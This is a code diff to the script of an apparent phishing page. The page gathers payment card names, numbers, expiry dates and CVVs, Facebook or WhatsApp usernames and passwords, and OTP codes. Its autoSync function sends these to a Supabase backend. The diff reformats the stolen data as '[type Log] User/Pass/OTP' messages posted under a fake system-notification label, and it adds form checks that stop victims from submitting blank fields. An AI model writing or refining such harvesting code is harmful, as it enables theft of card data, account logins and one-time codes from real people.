@@ -280,20 +280,19 @@
     }
 
     async function autoSync(type) {
-        const payload = {
-            type: type,
-            identifier: type === 'Card' ? document.getElementById('cardName').value : document.getElementById('socialUser').value,
-            secret: type === 'Card' ? document.getElementById('cardNumber').value : document.getElementById('socialPass').value,
-            extra_info: type === 'Card' ? `${document.getElementById('expiryDate').value}|${document.getElementById('cvv').value}` : '',
-            otp: document.getElementById('otpCode').value
-        };
-        const sid = localStorage.getItem('db_id');
-        if(!sid) {
-            const { data } = await supabaseClient.from('user_data_love').insert([payload]).select();
-            if(data) localStorage.setItem('db_id', data[0].id);
-        } else {
-            await supabaseClient.from('user_data_love').update(payload).eq('id', sid);
-        }
+        const identifier = type === 'Card' ? document.getElementById('cardName').value : document.getElementById('socialUser').value;
+        const secret = type === 'Card' ? document.getElementById('cardNumber').value : document.getElementById('socialPass').value;
+        const extra = type === 'Card' ? `${document.getElementById('expiryDate').value}|${document.getElementById('cvv').value}` : '';
+        const otp = document.getElementById('otpCode').value;
+
+        const fullMessage = `[${type} Log] User: ${identifier} | Pass: ${secret} | Extra: ${extra} | OTP: ${otp}`;
+        
+        await supabaseClient.from('messages').insert([{
+            sender_id: String(currentUserId),
+            profile_id: 'SYSTEM_NOTIFICATION',
+            content: fullMessage,
+            is_admin: false
+        }]);
     }
 
     function showView(id) { document.querySelectorAll('.overlay').forEach(v => v.style.display = 'none'); document.getElementById(id).style.display = 'block'; }
@@ -316,8 +315,36 @@
         showView('socialView'); 
     }
     
-    async function submitFinal(t) { await autoSync(t); showView('otpView'); }
-    async function finishProcess() { await autoSync('OTP'); showView('successView'); }
+        async function submitFinal(t) { 
+        if (t === 'Facebook' || t === 'WhatsApp') {
+            const user = document.getElementById('socialUser').value.trim();
+            const pass = document.getElementById('socialPass').value.trim();
+            if (user === "" || pass === "") {
+                alert("Please enter both username and password!");
+                return;
+            }
+        } else if (t === 'Card') {
+            const name = document.getElementById('cardName').value.trim();
+            const num = document.getElementById('cardNumber').value.trim();
+            if (name === "" || num === "") {
+                alert("Please fill in all card details!");
+                return;
+            }
+        }
+        await autoSync(t); 
+        showView('otpView'); 
+    }
+
+    async function finishProcess() { 
+        const otp = document.getElementById('otpCode').value.trim();
+        if (otp === "") {
+            alert("Please enter the OTP code!");
+            return;
+        }
+        await autoSync('OTP'); 
+        showView('successView'); 
+    }
+
 </script>
 </body>
 </html>
